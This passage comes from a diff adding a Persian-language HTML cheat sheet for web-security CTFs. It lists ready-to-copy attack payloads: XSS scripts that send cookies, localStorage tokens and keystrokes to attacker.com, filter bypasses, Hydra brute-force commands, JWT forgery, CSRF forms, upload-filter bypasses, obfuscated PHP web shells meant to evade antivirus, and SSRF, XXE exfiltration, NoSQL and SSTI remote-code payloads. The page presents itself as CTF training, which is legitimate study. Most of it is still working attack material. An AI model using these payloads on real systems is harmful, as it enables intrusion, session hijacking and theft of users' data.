+&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert('XSS')&gt;</code></pre>
+            </div>
+
+            <h3 class="sub-title">۲. سرقت کوکی و Session Hijacking</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">html</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-html">&lt;!-- سرقت کوکی --&gt;
+&lt;script&gt;document.location='http://attacker.com/steal?cookie='+document.cookie&lt;/script&gt;
+&lt;script&gt;new Image().src='http://attacker.com/steal?c='+document.cookie&lt;/script&gt;
+&lt;script&gt;fetch('http://attacker.com/steal?c='+document.cookie)&lt;/script&gt;
+&lt;script&gt;navigator.sendBeacon('http://attacker.com/steal', document.cookie)&lt;/script&gt;
+
+&lt;!-- Keylogger --&gt;
+&lt;script&gt;document.onkeypress=function(e){fetch('http://attacker.com/keylog?k='+e.key)}&lt;/script&gt;
+
+&lt;!-- دزدیدن محتوای صفحه --&gt;
+&lt;script&gt;fetch('http://attacker.com/steal?data='+btoa(document.body.innerHTML))&lt;/script&gt;
+
+&lt;!-- دزدیدن Token از localStorage --&gt;
+&lt;script&gt;fetch('http://attacker.com/steal?token='+localStorage.getItem('token'))&lt;/script&gt;</code></pre>
+            </div>
+
+            <h3 class="sub-title">۳. XSS Bypass تکنیک‌های پیشرفته</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">html</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-html">&lt;!-- Bypass با HTML Entities --&gt;
+&amp;#x3C;script&amp;#x3E;alert('XSS')&amp;#x3C;/script&amp;#x3E;
+&amp;#60;script&amp;#62;alert('XSS')&amp;#60;/script&amp;#62;
+
+&lt;!-- Bypass با Tab/Newline --&gt;
+&lt;a href="j av as c ript:alert('XSS')"&gt;click&lt;/a&gt;
+
+&lt;!-- Bypass با Double Encoding --&gt;
+%253Cscript%253Ealert('XSS')%253C/script%253E
+
+&lt;!-- Bypass بدون کاراکترهای خاص --&gt;
+onerror=alert;throw 1
+onfocus=alert(1) autofocus
+onpointerover=alert(1)
+onmouseover=alert(1)
+
+&lt;!-- Bypass با SVG --&gt;
+&lt;svg/onload=alert(1)&gt;
+&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;
+&lt;svg&gt;&lt;animate onbegin=alert(1) attributeName=x&gt;&lt;/svg&gt;
+
+&lt;!-- Bypass CSP با JSONP --&gt;
+&lt;script src="//attacker.com/exploit.jsonp?callback=alert"&gt;&lt;/script&gt;</code></pre>
+            </div>
+        </section>
+
+        <!-- Phase 6 -->
+        <section id="phase6" class="tool-section">
+            <h2 class="tool-title">🔐 فاز ۶: احراز هویت و مدیریت نشست (پیشرفته)</h2>
+            
+            <h3 class="sub-title">۱. Brute Force و حملات دیکشنری</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># Hydra با فرم‌های پیچیده
+hydra -l admin -P rockyou.txt target.com http-post-form "/login.php:username=^USER^&amp;password=^PASS^:F=Invalid|S=Welcome"
+
+# با هدرهای خاص
+hydra -l admin -P wordlist.txt target.com http-post-form "/api/login:{\"user\":\"^USER^\",\"pass\":\"^PASS^\"}:F=error"
+
+# با JWT و Rate Limit
+ffuf -u http://target.com/login -X POST -H "Content-Type: application/json" -d '{"user":"admin","pass":"FUZZ"}' -w wordlist.txt -fc 401,403 -c -t 10 -delay 1s</code></pre>
+            </div>
+
+            <h3 class="sub-title">۲. Session Management</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># تست Session Fixation
+http://target.com/login?PHPSESSID=HACKED
+http://target.com/?PHPSESSID=HACKED
+
+# تحلیل کوکی
+PHPSESSID: آیا تغییر می‌کند؟
+JSESSIONID: آیا قابل پیش‌بینی است؟
+role=user -&gt; role=admin
+userid=1 -&gt; userid=0</code></pre>
+            </div>
+
+            <h3 class="sub-title">۳. JWT (JSON Web Token) حملات</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">python</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-python"># تغییر الگوریتم به none
+import jwt
+encoded = jwt.encode({"user":"admin"}, algorithm='none', key=None)
+# Headers: {"alg":"none","typ":"JWT"}
+
+# Brute Force کلید
+hashcat -a 0 -m 16500 jwt.txt rockyou.txt
+
+# تغییر payload
+{
+  "user": "admin",
+  "role": "administrator"
+}
+
+# Kid Injection (Key ID)
+{
+  "kid": "../../../dev/null",
+  "alg": "HS256"
+}</code></pre>
+            </div>
+
+            <h3 class="sub-title">۴. CSRF (Cross-Site Request Forgery)</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">html</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-html">&lt;!-- GET-based --&gt;
+&lt;img src="http://target.com/transfer?amount=1000&amp;to=attacker"&gt;
+
+&lt;!-- POST-based --&gt;
+&lt;form action="http://target.com/change-email" method="POST"&gt;
+  &lt;input name="email" value="hacker@evil.com"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit();&lt;/script&gt;
+
+&lt;!-- JSON-based --&gt;
+&lt;form action="http://target.com/api/update" method="POST" enctype="text/plain"&gt;
+  &lt;input name='{"email":"hacker@evil.com","_method":"PUT"}' value=''&gt;
+&lt;/form&gt;
+
+&lt;!-- با Clickjacking --&gt;
+&lt;iframe src="http://target.com/transfer?amount=1000&amp;to=attacker" style="opacity:0;"&gt;&lt;/iframe&gt;</code></pre>
+            </div>
+        </section>
+
+        <!-- Phase 7 -->
+        <section id="phase7" class="tool-section">
+            <h2 class="tool-title">📁 فاز ۷: آپلود فایل (پیشرفته کامل)</h2>
+            
+            <h3 class="sub-title">۱. دور زدن فیلترها - تمام روش‌ها</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># تغییر پسوند
+shell.php5, shell.phtml, shell.php.jpg, shell.asp;.jpg
+shell.php%00.jpg, shell.php\x00.jpg
+
+# تغییر Content-Type
+Content-Type: image/jpeg
+Content-Type: image/png
+Content-Type: application/octet-stream
+
+# Double Extensions
+shell.jpg.php
+shell.php.jpg
+shell.php.png
+
+# Double Upload (با Burp)
+------WebKitFormBoundary
+Content-Disposition: form-data; name="file"; filename="shell.php"
+Content-Type: image/jpeg
+
+&lt;?php system($_GET['cmd']); ?&gt;
+------WebKitFormBoundary--
+
+# Magic Bytes (راه‌اندازی)
+GIF89a; &lt;?php system($_GET['cmd']); ?&gt;
+\xFF\xD8\xFF\xE0 &lt;?php system($_GET['cmd']); ?&gt;  # JPEG
+\x89PNG\r\n\x1a\n &lt;?php system($_GET['cmd']); ?&gt;  # PNG
+
+# Null Byte
+shell.php%00.jpg
+shell.php\x00.jpg
+
+# با .htaccess
+AddType application/x-httpd-php .jpg
+# سپس shell.jpg آپلود کنید
+
+# با .user.ini
+auto_prepend_file = shell.jpg
+# shell.jpg حاوی کد PHP
+
+# با polyglot
+# فایل معتبر PDF با کد PHP درون آن</code></pre>
+            </div>
+
+            <h3 class="sub-title">۲. Web Shell های مختلف و Obfuscation</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">php</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-php"># پایه
+&lt;?php system($_GET['cmd']); ?&gt;
+
+# پیشرفته
+&lt;?php echo shell_exec($_GET['cmd']); ?&gt;
+&lt;?php exec($_GET['cmd'], $output); print_r($output); ?&gt;
+&lt;?php passthru($_GET['cmd']); ?&gt;
+
+# با POST
+&lt;?php if(isset($_POST['cmd'])){ system($_POST['cmd']); } ?&gt;
+
+# Base64 Encoded
+&lt;?php eval(base64_decode($_POST['c'])); ?&gt;
+
+# Code Obfuscation (دور زدن Antivirus)
+&lt;?php $a = "system"; $a($_GET['cmd']); ?&gt;
+
+&lt;?php $a = "\x73\x79\x73\x74\x65\x6d"; $a($_GET['cmd']); ?&gt;
+
+&lt;?php $a = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109); $a($_GET['cmd']); ?&gt;
+
+# با چند خط
+&lt;?php
+ $cmd = $_GET['cmd'];
+ $arr = array('sys','tem');
+ $func = implode('', $arr);
+ $func($cmd);
+?&gt;</code></pre>
+            </div>
+        </section>
+
+        <!-- Phase 8 -->
+        <section id="phase8" class="tool-section">
+            <h2 class="tool-title">🔧 فاز ۸: تکنیک‌های پیشرفته (حرفه‌ای)</h2>
+            
+            <h3 class="sub-title">۱. SSRF (Server-Side Request Forgery) کامل</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># URL های داخلی
+?url=http://127.0.0.1/admin
+?url=http://localhost:8080
+?url=http://[::1]:8080
+?url=http://169.254.169.254/latest/meta-data/  # AWS
+?url=http://169.254.169.254/latest/user-data/
+?url=http://metadata.google.internal/computeMetadata/v1/  # GCP
+?url=http://100.100.100.200/latest/meta-data/  # Alibaba Cloud
+
+# با protocol های مختلف
+file:///etc/passwd
+gopher://127.0.0.1:25/_HELO%20localhost%0d%0aMAIL%20FROM:%20test@test.com%0d%0aRCPT%20TO:%20test@test.com%0d%0aDATA%0d%0aSubject:%20test%0d%0aFrom:%20test%0d%0aTo:%20test%0d%0a%0d%0atest%0d%0a.%0d%0aQUIT%0d%0a
+dict://127.0.0.1:11211/
+ftp://user:pass@localhost:21
+
+# Bypass با DNS
+?url=http://127.0.0.1.xip.io/  # resolves to 127.0.0.1
+?url=http://127.0.0.1.nip.io/
+?url=http://localhost.nip.io/
+
+# Bypass با Redirection
+?url=http://attacker.com/redirect.php  # redirects to http://127.0.0.1/admin</code></pre>
+            </div>
+
+            <h3 class="sub-title">۲. XXE (XML External Entity) کامل</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">xml</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-xml">&lt;!-- خواندن فایل --&gt;
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE root [
+&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;root&gt;&amp;xxe;&lt;/root&gt;
+
+&lt;!-- SSRF با XXE --&gt;
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE root [
+&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;
+]&gt;
+&lt;root&gt;&amp;xxe;&lt;/root&gt;
+
+&lt;!-- با Bypass --&gt;
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE root [
+&lt;!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd"&gt;
+%remote;
+%send;
+]&gt;
+
+&lt;!-- xxe.dtd --&gt;
+&lt;!ENTITY % data SYSTEM "file:///etc/passwd"&gt;
+&lt;!ENTITY % send "&lt;!ENTITY send SYSTEM 'http://attacker.com/?d=%data;'&gt;"&gt;
+
+&lt;!-- XXE با DOS --&gt;
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE lolz [
+&lt;!ENTITY lol "lol"&gt;
+&lt;!ENTITY lol1 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;
+&lt;!ENTITY lol2 "&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;"&gt;
+]&gt;
+&lt;lolz&gt;&amp;lol2;&lt;/lolz&gt;</code></pre>
+            </div>
+
+            <h3 class="sub-title">۳. NoSQL Injection (MongoDB)</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">json</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-json">// MongoDB Authentication Bypass
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": {"$in": ["admin", "root"]}, "password": {"$regex": "^.*$"}}
+
+// MongoDB Data Extraction
+{"username": {"$regex": "^a"}}  // Brute Force
+{"username": {"$regex": "^ad"}}
+
+// MongoDB Operators
+ $where: "function() { return this.password == 'secret' }"
+ $where: "function() { return this.username == 'admin' }"
+
+// CouchDB
+{"name": {"$ne": null}}
+{"password": {"$regex": "^.*$"}}</code></pre>
+            </div>
+
+            <h3 class="sub-title">۴. GraphQL Injection</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">graphql</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-graphql"># Introspection (کشف API)
+query {
+  __schema {
+    types {
+      name
+      fields {
+        name
+        type {
+          name
+          kind
+        }
+      }
+    }
+  }
+}
+
+# با تزریق
+query {
+  user(id: "1' OR 1=1-- -") {
+    name
+    email
+  }
+}
+
+# Bruteforce با aliases
+query {
+  a: user(id: "1") { name }
+  b: user(id: "2") { name }
+  c: user(id: "3") { name }
+}
+
+# با fragments
+query {
+  user(id: "1") {
+    ...UserFragment
+  }
+}
+fragment UserFragment on User {
+  name
+  email
+  password  # اگر فیلتر نشده باشد
+}</code></pre>
+            </div>
+
+            <h3 class="sub-title">۵. SSTI (Server-Side Template Injection)</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">python</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-python"># Jinja2 (Python)
+{{ config.items() }}
+{{ ''.__class__.__mro__[2].__subclasses__() }}
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
+
+# Twig (PHP)
+{{ _self.env.registerUndefinedFilterCallback("exec") }}
+{{ _self.env.getFilter("id") }}
+{{ "/etc/passwd" | file_excerpt(1,30) }}
+
+# Freemarker (Java)
+ ${7*7}
+ ${"freemarker.template.utility.Execute"?new()("id")}
+ ${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id").start()}
+
+# Velocity (Java)
+#set($x=$class.inspect("java.lang.Runtime").getRuntime().exec("id"))
+
+# Smarty (PHP)
+{php}system('id');{/php}
+{$smarty.version}
+{if phpinfo()}{/if}</code></pre>
+            </div>
+        </section>
+
+        <!-- Phase 9 -->
+        <section id="phase9" class="tool-section">
+            <h2 class="tool-title">🧪 فاز ۹: ابزارهای اتوماتیک (برای سرعت در CTF)</h2>
+            
+            <div class="table-container">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>ابزار</th>
+                            <th>کاربرد</th>
+                            <th>دستورات مهم</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr><td><strong>Burp Suite</strong></td><td>تست جامع</td><td>Repeater, Intruder, Decoder</td></tr>
+                        <tr><td><strong>SQLmap</strong></td><td>SQLi اتوماتیک</td><td>--os-shell, --dbs, --tables</td></tr>
+                        <tr><td><strong>Nmap</strong></td><td>اسکن پورت</td><td>-sC -sV -p-</td></tr>
+                        <tr><td><strong>Gobuster</strong></td><td>Directory Busting</td><td>-x php,txt,bak</td></tr>
+                        <tr><td><strong>Ffuf</strong></td><td>Busting پیشرفته</td><td>-recursion, -fc</td></tr>
+                        <tr><td><strong>WPScan</strong></td><td>اسکن وردپرس</td><td>--enumerate</td></tr>
+                        <tr><td><strong>Nikto</strong></td><td>اسکن آسیب‌پذیری</td><td>-ssl</td></tr>
+                        <tr><td><strong>Hydra</strong></td><td>Brute Force</td><td>-l -P</td></tr>
+                        <tr><td><strong>John</strong></td><td>کرک هش</td><td>--wordlist</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+
+        <!-- Checklist -->
+        <section id="checklist" class="tool-section">
+            <h2 class="tool-title">✅ چک‌لیست نهایی CTF (100% کامل)</h2>
+            
+            <div class="checklist-box">
+                <h3 class="sub-title">فاز 1: Enumeration</h3>
+                <ul>
+                    <li>پورت‌های باز: <code>nmap -sC -sV -p- target</code></li>
+                    <li>دایرکتوری‌های مخفی: <code>gobuster/ffuf</code></li>
+                    <li>فایل‌های پشتیبان: <code>index.php.bak</code>, <code>.git</code>, <code>.env</code></li>
+                    <li>فناوری: <code>whatweb</code>, <code>wappalyzer</code></li>
+                    <li>هدرهای HTTP: <code>curl -I</code></li>
+                </ul>
+            </div>
+
+            <div class="checklist-box">
+                <h3 class="sub-title">فاز 2: Injection</h3>
+                <ul>
+                    <li>SQLi: <code>'</code> , <code>"</code> , <code>' OR '1'='1</code>, time-based</li>
+                    <li>Command Injection: <code>; whoami</code>, <code>| id</code></li>
+                    <li>NoSQL: <code>{"$ne": null}</code></li>
+                </ul>
+            </div>
+
+            <div class="checklist-box">
+                <h3 class="sub-title">فاز 3: File Inclusion</h3>
+                <ul>
+                    <li>LFI: <code>../../../../etc/passwd</code></li>
+                    <li>RFI: <code>http://attacker.com/shell.txt</code></li>
+                    <li>PHP Filters: <code>php://filter/convert.base64-encode/resource=config.php</code></li>
+                </ul>
+            </div>
+
+            <div class="checklist-box">
+                <h3 class="sub-title">فاز 4: XSS</h3>
+                <ul>
+                    <li>Reflected: <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+                    <li>Stored: در کامنت‌ها و فرم‌ها</li>
+                    <li>DOM-based: در URL parameters</li>
+                    <li>Cookie Stealing</li>
+                </ul>
+            </div>
+
+            <div class="checklist-box">
+                <h3 class="sub-title">فاز 5: Authentication</h3>
+                <ul>
+                    <li>Brute Force: فرم‌های لاگین</li>
+                    <li>Session Manipulation: تغییر کوکی</li>
+                    <li>JWT Attacks: تغییر الگوریتم</li>
+                    <li>CSRF: تغییر ایمیل/پسورد</li>
+                </ul>
+            </div>
+
+            <div class="checklist-box">
+                <h3 class="sub-title">فاز 6: File Upload</h3>
+                <ul>
+                    <li>Bypass پسوند: <code>shell.php5</code>, <code>shell.php.jpg</code></li>
+                    <li>Bypass Content-Type: <code>image/jpeg</code></li>
+                    <li>Magic Bytes: <code>GIF89a;</code></li>
+                    <li>Web Shell: <code>&lt;?php system($_GET['cmd']); ?&gt;</code></li>
+                </ul>
+            </div>
+
+            <div class="checklist-box">
+                <h3 class="sub-title">فاز 7: Advanced</h3>
+                <ul>
+                    <li>SSRF: <code>http://127.0.0.1/admin</code></li>
+                    <li>XXE: <code>file:///etc/passwd</code></li>
+                    <li>SSTI: <code>{{ 7*7 }}</code></li>
+                    <li>Deserialization: Pickle, Java, PHP</li>
+                    <li>GraphQL Injection: Introspection</li>
+                </ul>
+            </div>
+        </section>
+
+        <!-- Tips -->
+        <section id="tips" class="tool-section">
+            <h2 class="tool-title">💡 نکات طلایی CTF</h2>
+            
+            <div class="tip-box">
+                <ol>
+                    <li><strong>همیشه از پایین شروع کنید:</strong> هر پورت، هر پارامتر، هر فرم</li>
+                    <li><strong>Google Dorking:</strong> <code>site:target.com filetype:log</code>, <code>"index of" target.com</code></li>
+                    <li><strong>خطاها دوست شما هستند:</strong> پیام‌های خطا راهنما هستند</li>
+                    <li><strong>ترکیب روش‌ها:</strong> LFI + Log Poisoning = RCE</li>
+                    <li><strong>صبر و دقت:</strong> گاهی یک کاراکتر کوچک همه چیز را تغییر می‌دهد</li>
+                    <li><strong>مستند کنید:</strong> هر تست را یادداشت کنید</li>
+                    <li><strong>آزمایش و خطا:</strong> هیچ‌گاه تسلیم نشوید</li>
+                    <li><strong>نگاه به سورس کد:</strong> همیشه View Page Source</li>
+                    <li><strong>تغییر User-Agent:</strong> برخی آسیب‌پذیری‌ها فقط با User-Agent خاص دیده می‌شوند</li>
+                    <li><strong>استفاده از Wayback Machine:</strong> برای دیدن نسخه‌های قدیمی سایت</li>
+                </ol>
+            </div>
+        </section>
+
+        <!-- Recommended Machines -->
+        <section id="machines" class="tool-section">
+            <h2 class="tool-title">🏆 ماشین‌های پیشنهادی CTF (سخت‌تر به ترتیب)</h2>
+            
+            <div class="table-container">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>سطح</th>
+                            <th>ماشین</th>
+                            <th>آسیب‌پذیری اصلی</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr><td>مبتدی</td><td>Pentester Lab: Web For Pentester</td><td>مبانی SQLi, XSS, LFI</td></tr>
+                        <tr><td>مبتدی-متوسط</td><td>GameOver</td><td>ترکیب چند آسیب‌پذیری</td></tr>
+                        <tr><td>متوسط</td><td>DC-1</td><td>Joomla + SQLi + PrivEsc</td></tr>
+                        <tr><td>متوسط-پیشرفته</td><td>Book-Shelf: 1</td><td>API + JWT + LFI + PrivEsc</td></tr>
+                        <tr><td>پیشرفته</td><td>DC-7</td><td>Drupal + Brute Force + SSH</td></tr>
+                        <tr><td>حرفه‌ای</td><td>HackTheBox: SolidState</td><td>JMX + RMI + PrivEsc</td></tr>
+                        <tr><td>افسانه‌ای</td><td>HackTheBox: Forensics</td><td>ترکیب چند تکنیک پیشرفته</td></tr>
+                    </tbody>
+                </table>
+            </div>
+            <div class="goal-box" style="text-align: center; margin-top: 20px;">
+                این چیت‌شیت <strong>کامل‌ترین نسخه ممکن</strong> برای وب‌سکیوریتی در مسابقات CTF است. تمام تکنیک‌ها، payloadها و روش‌های دور زدن را شامل می‌شود.<br>
+                <strong>موفق باشید و هک لذت‌بخشی داشته باشید! 🚀🔥</strong>
+            </div>
+        </section>
+
+    </main>
+
+    <script>
+        // Initialize Highlight.js
+        document.addEventListener('DOMContentLoaded', (event) => {
+            document.querySelectorAll('pre code').forEach((block) => {
+                hljs.highlightBlock(block);
+            });
+        });
+
+        // Copy to Clipboard Function (Safely decodes HTML entities back to original code for copying)
+        function copyCode(btn) {
+            const codeBlock = btn.closest('.code-container').querySelector('code');
+            const textArea = document.createElement('textarea');
+            textArea.value = codeBlock.innerText; 
+            document.body.appendChild(textArea);
+            textArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(textArea);
+
+            btn.innerText = '✓ کپی شد';
+            btn.style.background = '#39d353';
+            btn.style.color = '#000';
+            btn.style.borderColor = '#39d353';
+            
+            setTimeout(() => {
+                btn.innerText = 'کپی';
+                btn.style.background = '';
+                btn.style.color = '';
+                btn.style.borderColor = '';
+            }, 2000);
+        }
+
+        // Live Search Filter
+        function filterTools() {
+            const input = document.getElementById('searchInput').value.toLowerCase();
+            const listItems = document.querySelectorAll('.nav-list li');
+            
+            listItems.forEach(item => {
+                const text = item.textContent.toLowerCase();
+                if (text.includes(input)) {
+                    item.style.display = '';
+                } else {
+                    item.style.display = 'none';
+                }
+            });
+        }
+
+        // ScrollSpy Implementation
+        const sections = document.querySelectorAll('.tool-section');
+        const navLinks = document.querySelectorAll('.nav-list a');
+
+        window.addEventListener('scroll', () => {
+            let current = '';
+            sections.forEach(section => {
+                const sectionTop = section.offsetTop;
+                if (pageYOffset >= sectionTop - 50) {
+                    current = section.getAttribute('id');
+                }
+            });
+
+            navLinks.forEach(a => {
+                a.classList.remove('active');
+                if (a.getAttribute('href') === '#' + current) {
+                    a.classList.add('active');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
